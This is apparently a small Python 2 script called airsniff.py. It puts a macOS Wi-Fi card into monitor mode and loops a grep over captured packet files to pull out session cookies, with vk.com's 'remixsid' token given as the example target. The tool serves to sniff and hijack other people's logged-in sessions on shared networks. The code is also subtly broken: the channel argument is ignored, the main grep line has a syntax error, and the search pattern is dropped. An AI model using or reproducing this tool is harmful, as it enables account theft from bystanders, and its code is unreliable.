#!/usr/bin/env python 

#coding:utf-8
import sys
import signal
import subprocess
import time


if len(sys.argv) == 1:
	print('''
------------------
Usage: airsniff.py <channel> <\"pattern\">
<channell> - wifi channel
<\"pattern\"> - regexp that will grep /tmp/*.cap file. Quotes and backslashes required!
Example for vk.com: airsniff.py 10 \"remixsid=[a-z0-9]{68}"\
''')
	sys.exit();

channel = sys.argv[1]
pattern = sys.argv[2]

print "Pattern is " + pattern


# kill loop and airport process when press Ctrl+C
def signal_handler(signal, frame):
	print ' Aborted.'
	subprocess.Popen(['kill', str(AirportObj.pid)])
	sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)


##########
##########
##########

# Remove all *.cap from /tmp/
print "rm /tmp/*.cap"
rm = subprocess.call("rm /tmp/*.cap", shell=True)

# Switch airport into monitor and put process in backgroung
# If you exit non clear airport process still be run in background
print "Switch airport into monitor mode on channel " + channel  
AirportObj = subprocess.Popen(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport','sniff','10'], stdout=subprocess.PIPE)

time.sleep(2)

if (AirportObj.poll() != None):
	print AirportObj.poll()	
	print "\nError!\nTry run /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en1 scan" 
	sys.exit()

print "Now run in loop:  grep -aEo " + pattern + "/tmp/*.cap"
print "Press Ctrl+C to abort."
while True:
	print '~~~~~~~~~~~~'
	GrepObj = subprocess.call(['grep -aEo /tmp/*.cap', shell=True)
#	GrepObj = subprocess.Popen(['grep','-aEo', pattern, '/tmp/*.cap'], stdout=subprocess.PIPE)
#	matches = GrepObj.stdout.read()
#	print matches
	time.sleep(10)
